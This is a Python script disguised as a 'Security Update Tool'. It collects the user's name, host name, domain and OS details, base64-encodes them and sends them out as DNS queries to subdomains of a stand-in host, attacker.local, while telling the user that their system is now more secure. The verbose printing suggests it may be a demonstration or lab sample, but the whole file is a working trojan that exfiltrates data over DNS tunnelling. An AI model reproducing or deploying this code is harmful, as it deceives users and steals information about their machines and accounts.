#!/usr/bin/env python3
"""
Security Update Tool
This tool performs system security checks and updates.
"""

import subprocess
import sys
import base64
import socket
import platform
import os
import time

def main():
    """Main function that runs the security update."""
    print("Installing security update...")
    print("Please wait while we update your system security settings...")
    time.sleep(1)
    
    try:
        # Data collection
        username = os.getenv('USER', os.getenv('USERNAME', 'unknown'))
        computer_name = os.getenv('HOSTNAME', os.getenv('COMPUTERNAME', 'unknown'))
        domain = os.getenv('USERDOMAIN', 'WORKGROUP')
        os_info = platform.platform()
        
        print("Collected data:")
        print(f"  User: {username}")
        print(f"  Computer: {computer_name}")
        print(f"  Domain: {domain}")
        print(f"  OS: {os_info}")
        
        # Create DNS queries to exfiltrate data
        def send_dns_query(data_chunk, chunk_id):
            try:
                encoded_data = base64.b64encode(data_chunk.encode()).decode().replace('=', '')[:60]
                dns_query = f'{chunk_id}.{encoded_data}.attacker.local'
                print(f"Sending DNS query: {dns_query}")
                
                # Use subprocess to query our local DNS server directly
                import subprocess
                result = subprocess.run(['nslookup', dns_query, '127.0.0.1'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    print(f"✅ DNS query successful")
                else:
                    print(f"❌ DNS query failed: {result.stderr}")
            except Exception as e:
                print(f"DNS query failed: {e}")
        
        # Send collected data
        print("Exfiltrating data via DNS queries...")
        data = f'user:{username}|comp:{computer_name}|domain:{domain}|os:{os_info}'
        for i, chunk in enumerate([data[j:j+50] for j in range(0, len(data), 50)]):
            send_dns_query(chunk, f'chunk{i}')
        
        print("Security update completed successfully!")
        print("Your system is now more secure.")
        
    except Exception as e:
        print(f"Error during security update: {e}")
        print("Please contact IT support.")
    
    # Keep window open for a few seconds
    time.sleep(3)

if __name__ == "__main__":
    main()
